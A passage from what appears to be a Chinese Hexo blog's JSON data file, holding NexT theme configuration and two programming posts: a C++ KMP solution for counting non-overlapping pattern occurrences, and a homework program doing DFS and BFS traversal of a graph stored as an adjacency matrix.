instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":925,"excerpt":"<h1 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h1><blockquote><p>一块花布条，里面有些图案，另有一块直接可用的小饰条，里面也有一些图案。对于给定的花布条和小饰条，计算一下能从花布条中尽可能剪出几块小饰条来呢？</p>\n</blockquote>","more":"<h1 id=\"Input\"><a href=\"#Input\" class=\"headerlink\" title=\"Input\"></a>Input</h1><blockquote><p>输入中含有一些数据，分别是成对出现的花布条和小饰条，其布条都是用可见ASCII字符表示的，可见的ASCII字符有多少个，布条的花纹也有多少种花样。花纹条和小饰条不会超过1000个字符长。如果遇见#字符，则不再进行工作。</p>\n</blockquote>\n<h1 id=\"Output\"><a href=\"#Output\" class=\"headerlink\" title=\"Output\"></a>Output</h1><blockquote><p>输出能从花纹布中剪出的最多小饰条个数，如果一块都没有，那就老老实实输出0，每个结果之间应换行。</p>\n</blockquote>\n<h1 id=\"Sample-Input\"><a href=\"#Sample-Input\" class=\"headerlink\" title=\"Sample Input\"></a>Sample Input</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">abcde a3</span><br><span class=\"line\">aaaaaa  aa</span><br><span class=\"line\">#</span><br></pre></td></tr></table></figure>\n<h1 id=\"Sample-Output\"><a href=\"#Sample-Output\" class=\"headerlink\" title=\"Sample Output\"></a>Sample Output</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0</span><br><span class=\"line\">3</span><br></pre></td></tr></table></figure>\n<h1 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"built_in\">string</span> a,b;</span><br><span class=\"line\"><span class=\"keyword\">int</span> NEXT[<span class=\"number\">1020</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">get</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">-1</span>;</span><br><span class=\"line\">    NEXT[i]=j;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;b.length())&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==<span class=\"number\">-1</span>||b[i]==b[j])&#123;</span><br><span class=\"line\">            i++;j++;</span><br><span class=\"line\">            NEXT[i]=j;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> j=NEXT[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">kmp</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    get();</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">0</span>,ans=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;a.length())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==<span class=\"number\">-1</span>||a[i]==b[j])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            i++;j++;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(j==b.length())</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                ans++;</span><br><span class=\"line\">                j=<span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> j=NEXT[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;a)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(a[<span class=\"number\">0</span>]==<span class=\"string\">&#x27;#&#x27;</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cin</span>&gt;&gt;b;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;kmp()&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"图的邻接矩阵遍历","date":"2019-03-29T09:11:09.000Z","abbrlink":"4759e4d8","updated":"2020-04-08T10:40:24.000Z","_content":"# 图的邻接矩阵遍历\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint m[100][100],vis[100],N;\nvoid DFS_1(int n)\n{\n\tif(vis[n])return;\n\telse\n\t{\n\t\tcout<<\" -> \"<<n;\n\t\tvis[n]=1;\n\t\tfor(int i=0;i<N;i++)\n\t\tif(m[n][i]&&!vis[i])DFS_1(i);\n\t}\n}\nvoid DFS_2(int n)\n{\n\tstack<int>S;\n\tvis[n]=1;\n\tS.push(n);\n\twhile(!S.empty())\n\t{\n\t\tint t=S.top();\n\t\tcout<<\" -> \"<<t;\n\t\tS.pop();\n\t\tfor(int i=N-1;i>=0;i--)\n\t\t{\n\t\t\tif(m[t][i]&&!vis[i])\n\t\t\t{\n\t\t\t\tS.push(i);\n\t\t\t\tvis[i]=1;\n\t\t\t}\n\t\t}\n\t}\n}\nvoid BFS(int n)\n{\n\tqueue<int>Q;\n\tQ.push(n);\n\tvis[n]=1;\n\twhile(!Q.empty())\n\t{\n\t\tint t=Q.front();\n\t\tQ.pop();\n\t\tcout<<\" -> \"<<t;\n\t\tfor(int i=0;i<N;i++)\n\t\tif(m[t][i]&&!vis[i])\n\t\t{\n\t\t\tQ.push(i);\n\t\t\tvis[i]=1;\n\t\t}\n\t}\n}\nint main()\n{\n\tint a,b,ch;\n\tcin>>N;\n\tfor(int i=1;i<=N;i++)\n\t{\n\t\tcin>>a>>b;\n\t\tm[a][b]=1;\n\t\tm[b][a]=1;\n\t}\n\twhile(cin>>ch)\n\t{\n\t\tmemset(vis,0,sizeof(vis));\n\t\tif(ch==1)DFS_1(0);\n\t\telse if(ch==2)DFS_2(0);\n\t\telse if(ch==3)BFS(0);\n\t\telse break;\n\t\tcout<<endl;\n\t}\n\treturn 0;\n}\n```","source":"_posts/图的邻接矩阵遍历.md","raw":"---\ntitle: 图的邻接矩阵遍历\ndate: 2019-03-29 17:11:09\ncategories:\n  - 数据结构\ntags:\n  - 邻接矩阵\n  - DFS\n  - BFS\nabbrlink: 4759e4d8\nupdated:\n---\n# 图的邻接矩阵遍历\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint m[100][100],vis[100],N;\nvoid DFS_1(int n)\n{\n\tif(vis[n])return;\n\telse\n\t{\n\t\tcout<<\" -> \"<<n;\n\t\tvis[n]=1;\n\t\tfor(int i=0;i<N;i++)\n\t\tif(m[n][i]&&!vis[i])DFS_1(i);\n\t}\n}\nvoid DFS_2(int n)\n{\n\tstack<int>S;\n\tvis[n]=1;\n\tS.push(n);\n\twhile(!S.empty())\n\t{\n\t\tint t=S.top();\n\t\tcout<<\" -> \"<<t;\n\t\tS.pop();\n\t\tfor(int i=N-1;i>=0;i--)\n\t\t{\n\t\t\tif(m[t][i]&&!vis[i])\n\t\t\t{\n\t\t\t\tS.push(i);\n\t\t\t\tvis[i]=1;\n\t\t\t}\n\t\t}\n\t}\n}\nvoid BFS(int n)\n{\n\tqueue<int>Q;\n\tQ.push(n);\n\tvis[n]=1;\n\twhile(!Q.empty())\n\t{\n\t\tint t=Q.front();\n\t\tQ.pop();\n\t\tcout<<\" -> \"<<t;\n\t\tfor(int i=0;i<N;i++)\n\t\tif(m[t][i]&&!vis[i])\n\t\t{\n\t\t\tQ.push(i);\n\t\t\tvis[i]=1;\n\t\t}\n\t}\n}\nint main()\n{\n\tint a,b,ch;\n\tcin>>N;\n\tfor(int i=1;i<=N;i++)\n\t{\n\t\tcin>>a>>b;\n\t\tm[a][b]=1;\n\t\tm[b][a]=1;\n\t}\n\twhile(cin>>ch)\n\t{\n\t\tmemset(vis,0,sizeof(vis));\n\t\tif(ch==1)DFS_1(0);\n\t\telse if(ch==2)DFS_2(0);\n\t\telse if(ch==3)BFS(0);\n\t\telse break;\n\t\tcout<<endl;\n\t}\n\treturn 0;\n}\n```","slug":"图的邻接矩阵遍历","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkc90033qse51e8rgumg","content":"<h1 id=\"图的邻接矩阵遍历\"><a href=\"#图的邻接矩阵遍历\" class=\"headerlink\" title=\"图的邻接矩阵遍历\"></a>图的邻接矩阵遍历</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id=\"more\"></a><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> m[<span class=\"number\">100</span>][<span class=\"number\">100</span>],vis[<span class=\"number\">100</span>],N;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DFS_1</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(vis[n])<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot; -&gt; &quot;</span>&lt;&lt;n;</span><br><span class=\"line\">\t\tvis[n]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;N;i++)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(m[n][i]&amp;&amp;!vis[i])DFS_1(i);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DFS_2</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">stack</span>&lt;<span class=\"keyword\">int</span>&gt;S;</span><br><span class=\"line\">\tvis[n]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\tS.push(n);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(!S.empty())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> t=S.top();</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot; -&gt; &quot;</span>&lt;&lt;t;</span><br><span class=\"line\">\t\tS.pop();</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=N<span class=\"number\">-1</span>;i&gt;=<span class=\"number\">0</span>;i--)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(m[t][i]&amp;&amp;!vis[i])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tS.push(i);</span><br><span class=\"line\">\t\t\t\tvis[i]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">BFS</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">queue</span>&lt;<span class=\"keyword\">int</span>&gt;Q;</span><br><span class=\"line\">\tQ.push(n);</span><br><span class=\"line\">\tvis[n]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(!Q.empty())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> t=Q.front();</span><br><span class=\"line\">\t\tQ.pop();</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot; -&gt; &quot;</span>&lt;&lt;t;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;N;i++)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(m[t][i]&amp;&amp;!vis[i])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tQ.push(i);</span><br><span class=\"line\">\t\t\tvis[i]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,b,ch;</span><br><span class=\"line\">\t<span class=\"built_in\">cin</span>&gt;&gt;N;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class=\"line\">\t\tm[a][b]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tm[b][a]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;ch)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(vis,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(vis));</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(ch==<span class=\"number\">1</span>)DFS_1(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(ch==<span class=\"number\">2</span>)DFS_2(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(ch==<span class=\"number\">3</span>)BFS(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on 